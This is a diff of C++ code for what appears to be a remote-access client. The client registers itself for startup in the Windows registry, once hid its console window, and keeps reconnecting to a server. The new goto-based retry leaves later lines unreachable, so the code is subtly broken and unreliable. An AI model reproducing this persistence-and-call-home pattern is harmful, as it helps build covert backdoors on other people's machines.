@@ -21,8 +21,9 @@ int main()
 	hres = RegSetValueEx(hkey, L"client.exe", 0, REG_SZ, (BYTE*)csPath.GetBuffer(), (wcslen(csPath) + 1) * 2);
 
 	HWND myWindow = GetConsoleWindow();
-	ShowWindow(myWindow, SW_HIDE);
+	ShowWindow(myWindow, SW_SHOW);
 
+	RECONNECT:
 	SOCKET ConnectSocket = InitSocket();
 	if (ConnectSocket == 0) {
 		while (true) {
@@ -30,12 +31,10 @@ int main()
 			Sleep(2000);
 			printf("still can't connect to the server after 2s..\n");
 
-			g_ClientSock = InitSocket();
-			printf("cmdTypeFn.cpp  line 169: g_CLientSock: %d\n", g_ClientSock);
-			if (g_ClientSock == 0) {
-				continue;
-			}
+			printf("cmdTypeFn.cpp  line 169: g_CLientSock: %d\n", ConnectSocket);
+			goto RECONNECT;
 
+			g_ClientSock = ConnectSocket;
 			printf("established connection with server.\n");
 			break;
 		}
